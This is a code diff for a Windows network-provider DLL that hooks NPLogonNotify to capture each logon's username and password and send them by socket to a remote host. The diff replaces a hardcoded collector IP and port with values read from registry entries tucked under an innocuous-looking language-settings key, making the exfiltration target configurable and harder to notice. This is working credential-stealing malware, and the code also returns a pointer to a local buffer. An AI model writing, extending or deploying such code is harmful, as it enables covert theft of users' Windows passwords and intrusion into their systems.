@@ -1,15 +1,11 @@
-// code taken from PSBITS/PasswordStealing and modified
-
 #include <winsock2.h>
 #include <stdio.h>
-
 #include <Windows.h>
 
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 
-#define PORT 6006
-#define SERVER_IP "192.168.153.136"
+#define rKey L"SYSTEM\\CurrentControlSet\\Control\\MUI\\Settings\\LanguageConfiguration"
 
 // from npapi.h
 #define WNNC_SPEC_VERSION                0x00000001
@@ -50,11 +46,99 @@ typedef struct _MSV1_0_INTERACTIVE_LOGON
 } MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;
 
 
+DWORD getPtReg()
+{
+	HKEY hkey;
+	DWORD dw;
+	DWORD Type;
+	DWORD Datasize = 255;
+	DWORD port;
+
+
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+		rKey,
+		0,
+		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
+		&hkey) == ERROR_SUCCESS)
+
+	{
+		DWORD error = RegQueryValueEx(hkey,
+			L"pt",
+			NULL,
+			&Type,
+			(LPBYTE)&port,
+			&Datasize);
+
+		if (error == ERROR_SUCCESS)
+		{
+			RegCloseKey(hkey);
+			return port;
+		}
+	}
+	RegCloseKey(hkey);
+	return 80;
+}
+
+char* getIPReg()
+{
+	HKEY hKey;
+	char Data[255];
+	DWORD Datasize = sizeof(Data);
+	DWORD Type;
+	char ipa[20];
+	int indCtr = 0;
+
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+		rKey,
+		0,
+		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
+		&hKey) == ERROR_SUCCESS)
+
+	{
+		DWORD error = RegQueryValueEx(hKey,
+			L"ipa",
+			NULL,
+			&Type,
+			(LPBYTE)&Data,
+			&Datasize);
+
+		if (error == ERROR_SUCCESS)
+		{
+			for (int i = 0; i < sizeof(Data); i += 2)
+			{
+				if (Data[i] == '\0')
+				{
+					ipa[indCtr] = '\0';
+					break;
+				}
+				else
+				{
+					ipa[indCtr] = Data[i];
+					indCtr++;
+				}
+
+			}
+			//printf("%s", ipa);
+			RegCloseKey(hKey);
+			return ipa;
+		}
+
+	}
+
+	RegCloseKey(hKey);
+	return "8.8.8.8";
+}
+
+
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
 	WSADATA wsa;
 	SOCKET s;
 	struct sockaddr_in server;
+
+	char* ip = getIPReg();
+	DWORD port = getPtReg();
+	printf("%s:%d", ip, port);
 
 	char user[50];
 	char pass[50];
@@ -86,9 +170,9 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	printf("Socket created.\n");
 
 
-	server.sin_addr.s_addr = inet_addr(SERVER_IP);
+	server.sin_addr.s_addr = inet_addr(ip);
 	server.sin_family = AF_INET;
-	server.sin_port = htons(PORT);
+	server.sin_port = htons(port);
 
 	//Connect to remote server
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
@@ -157,4 +241,3 @@ NPLogonNotify(
 	lpLogonScript = NULL;
 	return WN_SUCCESS;
 }
-
